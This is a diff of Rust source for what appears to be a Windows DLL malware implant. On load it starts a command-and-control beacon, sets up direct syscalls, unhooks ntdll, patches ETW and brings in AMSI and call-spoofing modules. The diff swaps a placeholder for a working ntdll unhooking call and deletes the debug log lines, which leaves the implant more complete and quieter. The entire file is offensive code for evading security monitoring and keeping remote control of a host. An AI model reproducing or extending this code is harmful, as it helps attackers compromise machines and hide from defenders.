@@ -17,30 +17,25 @@ include!(concat!(env!("OUT_DIR"), "/xor_key.rs"));
 include!(concat!(env!("OUT_DIR"), "/c2_config.rs"));
 
 #[unsafe(no_mangle)]
-pub unsafe extern "system" fn DllMain(_instance: *mut ::core::ffi::c_void, reason: u32, _reserved: *mut ::core::ffi::c_void) -> i32 {
+pub unsafe extern "system" fn DllMain(_instance: *mut ::core::ffi::c_void, reason: u32, _reserved: *mut ::core::ffi::c_void) -> i32 { unsafe {
     if reason == 1 { // DLL_PROCESS_ATTACH
         beacon_entry();
     }
     1 // TRUE
-}
+}}
 
-unsafe fn beacon_entry() {
+unsafe fn beacon_entry() { unsafe {
     use core::net::beacon;
     use core::{ssn_table, etw, amsi, spoof};
     if !ssn_table::initialize_syscalls(::core::ptr::null_mut()) {
         return;
     }
 
-    let unhook_result: Option<usize> = todo!("Unhook ntdll");
+    let unhook_result: Option<usize> = ntdll_unhook::unhook_ntdll();
     if let Some(n) = unhook_result {
-        if n == 0 {
-            debug!("[*] [UNHOOK] ntdll clean, no hooks found");
-        } else {
-            debug!("[*] [UNHOOK] Restored {} hokked bytes in ntdll", n);
+        if n > 0 {
             ssn_table::initialize_syscalls(::core::ptr::null_mut());
         }
-    } else {
-        debug!("[*] [UNHOOK] Failed, continuing with potentially hooked ntdll");
     }
 
     etw::patch_etw();
@@ -63,7 +58,9 @@ unsafe fn beacon_entry() {
     };
 
     beacon::beacon_loop(&c2_config);
-}
+}}
 
 extern crate alloc;
 use alloc::vec::Vec;
+
+use crate::core::ntdll_unhook;
